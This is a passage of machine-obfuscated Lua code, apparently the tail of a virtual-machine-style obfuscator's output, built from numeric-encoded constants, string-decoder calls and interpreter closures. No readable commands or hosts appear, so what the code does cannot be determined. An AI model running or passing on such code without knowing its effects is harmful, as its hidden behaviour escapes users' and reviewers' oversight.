P=z[h]M=M(i,P)i=J(58467-119957)z=Y[H[819780+-819778]]S=J(259427+-320795)O=Y[H[889399+-889396]]i=M[i]h=O(S,k)P=z[h]i=i(M,P)z=Y[H[326132+-326130]]M=J(-704536-(-643046))S=J(781136-842460)k=31506591996786-25123 O=Y[H[978049-978046]]h=O(S,k)P=z[h]S=J(20812-82139)M=i[M]k=13029664104747-280952 M=M(i,P)z=Y[H[-686263+686265]]O=Y[H[-780022-(-780025)]]i=J(-671485+609995)h=O(S,k)i=M[i]P=z[h]k=1036648+30499933070866 i=i(M,P)M=J(-970308+908818)M=i[M]z=Y[H[-429389+429391]]O=Y[H[783140+-783137]]S=J(-254089-(-192626))h=O(S,k)P=z[h]M=M(i,P)z=Y[H[786761+-786759]]S=J(379478-441051)O=Y[H[-472996+472999]]k=13861526180305-(-1001317)i=J(-768518-(-707028))i=M[i]h=O(S,k)S=J(433590-495061)P=z[h]k=901155+715765317930 i=i(M,P)z=Y[H[150117-150115]]O=Y[H[711396+-711393]]h=O(S,k)M=J(-191896+130406)P=z[h]k=132714+25239263913854 M=i[M]S=J(-560527-(-498950))M=M(i,P)i=J(672676+-734166)z=Y[H[21568-21566]]O=Y[H[-868530+868533]]h=O(S,k)P=z[h]i=M[i]k=9797045126501-996243 i=i(M,P)z=Y[H[-53330+53332]]S=J(-824727-(-763312))O=Y[H[-265303-(-265306)]]h=O(S,k)E=13081718-934241 P=z[h]M=J(-914196+852706)S=J(335915+-397515)M=i[M]M=M(i,P)z=Y[H[-941207+941209]]k=898596+33010928092647 O=Y[H[-59775-(-59778)]]h=O(S,k)P=z[h]S=J(-1017297+955947)i=J(-332034+270544)i=M[i]k=3078563582275-347050 i=i(M,P)z=Y[H[12128-12126]]O=Y[H[815455+-815452]]h=O(S,k)k=23395913513573-(-1028137)P=z[h]M=J(819609+-881099)M=i[M]M=M(i,P)z=Y[H[385943+-385941]]O=Y[H[375748-375745]]S=J(824645-886271)h=O(S,k)P=z[h]S=30499785850016-(-146138)h=J(120109-181537)i=J(261440-322930)i=M[i]i=i(M,P)k=J(-847333-(-786000))P=Y[H[185077+-185075]]z=Y[H[650274-650271]]O=z(h,S)M=P[O]O=Y[H[237495-237493]]h=Y[H[854724-854721]]S=h(k,f)z=O[S]h=J(694458+-755837)O=o[h]D=Y[H[21903+-21902]]j=Y[H[384827-384825]]q=Y[H[688003-688000]]K=q(c,e)s=j[K]c=8212309102832-82432 f=D[s]K=J(-1003549+941919)s=Y[H[-627886-(-627888)]]j=Y[H[-435106-(-435109)]]q=j(K,c)D=s[q]K=770273+34758108626520 k=f[D]D=Y[H[-305651+305653]]s=Y[H[653440-653437]]q=J(-1043703+982315)j=s(q,K)f=D[j]S=k[f]h=O(S)P=z..h i[M]=P end else i=nil E=o[J(-984047-(-922548))]O=nil M={}P=nil z=nil end end else if E<15569382-(-860736)then if E<837217+14737189 then if E<221659+15091704 then D=W(D)c=nil P=W(P)S=nil O=W(O)q=nil k=W(k)k=J(-958775-(-897280))s=W(s)h=W(h)j=nil f=nil S=J(-512002+450507)j={}e=W(e)O=u()K=nil f=J(588691+-650209)E=1001562+1326203 P=nil s=u()z=W(z)q=u()z=nil Y[O]=P P=u()Y[P]=z h=o[S]S=J(364163-425689)z=h[S]c=-536456+536457 h=u()Y[h]=z S=o[k]k=J(-758638-(-697220))K={}e=-587598-(-587854)I=e z=S[k]k=o[f]f=J(-684239-(-622644))e=-207007+207008 g=e D=J(350104-411647)S=k[f]f=o[D]D=J(-742233-(-680859))k=f[D]f=534275+-534275 D=u()Y[D]=f f=820499-820497 Y[s]=f f={}Y[q]=j j=-629365-(-629365)e=184341-184341 V=g<e e=c-g else t=j==q b=t E=13340288-(-408739)end else f=-199705-(-199705)E=Y[H[-800282+800283]]P=z D=123335+-123080 k=E(f,D)i[P]=k E=-422572+13693650 P=nil end else if E<17252901-609671 then if E<749247+15691486 then M=J(181909+-243351)E=o[M]P=Y[H[98913-98912]]z=Y[H[-70193-(-70195)]]S=33207905018072-287857 h=J(-208056+146570)O=z(h,S)S=1023643+22753852984008 h=J(-1015997+954370)M=J(-445769-(-384416))i=P[O]M=E[M]M=M(E,i)E=J(118737-180227)P=Y[H[631815-631814]]z=Y[H[886170+-886168]]O=z(h,S)S=5209750621100-426547 i=P[O]h=J(617730+-679084)E=M[E]E=E(M,i)P=Y[H[-962565-(-962566)]]M=J(325295-386785)M=E[M]z=Y[H[902550-902548]]O=z(h,S)i=P[O]M=M(E,i)h=J(-293365+231845)S=25475925164318-(-847161)P=Y[H[-671086+671087]]E=J(-775745+714255)z=Y[H[-194896+194898]]O=z(h,S)i=P[O]E=M[E]S=-616554+26518980597926 E=E(M,i)P=Y[H[542156-542155]]z=Y[H[-504154-(-504156)]]M=J(689193+-750683)M=E[M]h=J(243869+-305376)O=z(h,S)S=7768528388972-(-35509)i=P[O]M=M(E,i)P=Y[H[-83693-(-83694)]]h=J(152213-213830)E=J(-829702+768212)z=Y[H[189100+-189098]]O=z(h,S)E=M[E]i=P[O]h=J(-299225-(-237590))E=E(M,i)P=Y[H[-114973+114974]]z=Y[H[-684805+684807]]M=J(-64316+2826)M=E[M]S=920702+17577747370875 O=z(h,S)i=P[O]M=M(E,i)S=-64216+32893188290221 h=J(-734281+672946)E=J(-444598+383108)P=Y[H[-200907+200908]]E=M[E]z=Y[H[-47224+47226]]O=z(h,S)i=P[O]E=E(M,i)h=J(-864726+803218)P=Y[H[998436-998435]]z=Y[H[876635-876633]]S=20169818045487-(-190593)M=J(284682+-346172)O=z(h,S)M=E[M]S=17725679901575-(-722103)h=J(-822965-(-761493))i=P[O]M=M(E,i)P=Y[H[659181-659180]]z=Y[H[-795017-(-795019)]]O=z(h,S)E=J(832109+-893599)E=M[E]i=P[O]E=E(M,i)h=J(-582763-(-521271))M=J(-284830-(-223340))S=-584176+6265844544853 P=Y[H[477616-477615]]z=Y[H[601986+-601984]]O=z(h,S)i=P[O]M=E[M]h=J(-62759-(-1279))S=8599766948968-756932 M=M(E,i)P=Y[H[859363+-859362]]z=Y[H[-761434-(-761436)]]O=z(h,S)i=P[O]S=15808390634877-245948 E=J(374906+-436396)E=M[E]E=E(M,i)P=Y[H[559685+-559684]]h=J(-38586+-22838)M=J(223081+-284571)M=E[M]z=Y[H[17601+-17599]]O=z(h,S)i=P[O]M=M(E,i)E=J(-949167-(-887677))S=-211662+19421177667105 P=Y[H[377263-377262]]h=J(-512716+451138)z=Y[H[927636-927634]]E=M[E]O=z(h,S)i=P[O]E=E(M,i)M=J(-808960+747430)M=E[M]M=M(E)M={}E=o[J(-984987-(-923487))]else c=e E=2425848-98083 r=c K[c]=r c=nil end else E=M and 649550+1564247 or 7061891-(-422542)end end end end end end end E=#w return L(M)end,function(o,J)local L=z(J)local m=function(m,H,w)return E(o,{m;H,w},J,L)end return m end,function(o)local J,E=1027567+-1027566,o[-472151+472152]while E do i[E],J=i[E]-(396407+-396406),(543599+-543598)+J if i[E]==397122-397122 then i[E],Y[E]=nil,nil end E=o[J]end end,{},function(o,J)local L=z(J)local m=function()return E(o,{},J,L)end return m end,function(o)i[o]=i[o]-(459508-459507)if-342078+342078==i[o]then i[o],Y[o]=nil,nil end end,function(o,J)local L=z(J)local m=function(m,H,w,C,M,Y)return E(o,{m,H;w;C;M;Y},J,L)end return m end return(h(-446488+5468777,{}))(L(M))end)(getfenv and getfenv()or _ENV,unpack or table[J(-141672-(-80207))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
